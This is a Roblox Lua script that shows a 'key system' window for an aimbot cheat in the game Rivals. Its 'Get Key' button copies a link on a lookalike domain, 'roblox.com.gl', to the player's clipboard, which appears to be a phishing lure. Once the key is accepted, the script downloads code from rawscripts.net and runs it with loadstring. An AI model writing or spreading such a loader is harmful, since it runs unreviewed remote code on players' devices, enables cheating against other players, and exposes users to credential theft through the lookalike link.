-- SETTINGS
local CorrectKey = "Hidden"
local KeyLink = "https://www.roblox.com.gl/users/485642586986/profile"

-- Prevent duplicate GUI
if game:GetService("CoreGui"):FindFirstChild("ZuyiKeySystem") then
    return
end

local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ZuyiKeySystem"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
Frame.Size = UDim2.new(0,0,0,0)
Frame.Position = UDim2.new(0.5,-180,0.5,-110)
Frame.BorderSizePixel = 0
Frame.Active = true

Instance.new("UICorner",Frame).CornerRadius = UDim.new(0,12)

-- Glow
local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(0,170,255)
Stroke.Thickness = 2
Stroke.Parent = Frame

-- Opening animation
TweenService:Create(
    Frame,
    TweenInfo.new(0.4,Enum.EasingStyle.Back),
    {Size = UDim2.new(0,360,0,220)}
):Play()

-- Title
local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Text = "AIMBOT RIVALS OP"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1,-40,0,40)

-- Close Button
local Close = Instance.new("TextButton")
Close.Parent = Frame
Close.Text = "X"
Close.Font = Enum.Font.GothamBold
Close.TextSize = 18
Close.TextColor3 = Color3.new(1,1,1)
Close.BackgroundColor3 = Color3.fromRGB(200,60,60)
Close.Size = UDim2.new(0,30,0,30)
Close.Position = UDim2.new(1,-35,0,5)

Instance.new("UICorner",Close)

-- Key Box
local KeyBox = Instance.new("TextBox")
KeyBox.Parent = Frame
KeyBox.PlaceholderText = "Enter Key..."
KeyBox.Text = ""
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.TextColor3 = Color3.fromRGB(255,255,255)
KeyBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
KeyBox.Size = UDim2.new(0.8,0,0,38)
KeyBox.Position = UDim2.new(0.1,0,0.35,0)

Instance.new("UICorner",KeyBox)

-- Status
local Status = Instance.new("TextLabel")
Status.Parent = Frame
Status.BackgroundTransparency = 1
Status.Size = UDim2.new(1,0,0,25)
Status.Position = UDim2.new(0,0,0.82,0)
Status.Text = ""
Status.Font = Enum.Font.Gotham
Status.TextSize = 14
Status.TextColor3 = Color3.fromRGB(255,255,255)

-- Click sound
local Click = Instance.new("Sound")
Click.SoundId = "rbxassetid://12221967"
Click.Volume = 1
Click.Parent = Frame

-- Button creator
local function CreateButton(text,pos,color)

    local Button = Instance.new("TextButton")
    Button.Parent = Frame
    Button.Text = text
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 16
    Button.TextColor3 = Color3.new(1,1,1)
    Button.BackgroundColor3 = color
    Button.Size = UDim2.new(0.35,0,0,38)
    Button.Position = pos

    Instance.new("UICorner",Button)

    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0,color),
        ColorSequenceKeypoint.new(1,color:lerp(Color3.new(1,1,1),0.3))
    }
    Gradient.Parent = Button

    Button.MouseButton1Click:Connect(function()
        Click:Play()
    end)

    return Button
end

-- Buttons
local CheckKey = CreateButton(
"Check Key",
UDim2.new(0.1,0,0.6,0),
Color3.fromRGB(0,170,255)
)

local GetKey = CreateButton(
"Get Key",
UDim2.new(0.55,0,0.6,0),
Color3.fromRGB(0,200,120)
)

-- Dragging system
local dragging
local dragInput
local dragStart
local startPos

Frame.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 then
dragging = true
dragStart = input.Position
startPos = Frame.Position

input.Changed:Connect(function()
if input.UserInputState == Enum.UserInputState.End then
dragging = false
end
end)
end
end)

Frame.InputChanged:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseMovement then
dragInput = input
end
end)

UIS.InputChanged:Connect(function(input)
if input == dragInput and dragging then

local delta = input.Position - dragStart

Frame.Position =
UDim2.new(
startPos.X.Scale,
startPos.X.Offset + delta.X,
startPos.Y.Scale,
startPos.Y.Offset + delta.Y
)

end
end)

-- Close button
Close.MouseButton1Click:Connect(function()
Click:Play()
ScreenGui:Destroy()
end)

-- Get Key
GetKey.MouseButton1Click:Connect(function()

if setclipboard then
    setclipboard(KeyLink)
end

pcall(function()
game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Link Copied!",
Text = "Paste Into Browser!",
Duration = 5
})
end)

Status.Text = "Link copied to clipboard!"
Status.TextColor3 = Color3.fromRGB(0,255,150)

end)

-- Check Key
CheckKey.MouseButton1Click:Connect(function()

if KeyBox.Text == CorrectKey then

Status.Text = "w twin!!"
Status.TextColor3 = Color3.fromRGB(0,255,150)

task.wait(1)

ScreenGui:Destroy()

pcall(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/RIVALS-BEST-WORKING-AIMBOT-FOR-112806", true))()
end)

else

Status.Text = "wrong bro!"
Status.TextColor3 = Color3.fromRGB(255,80,80)

end

end)
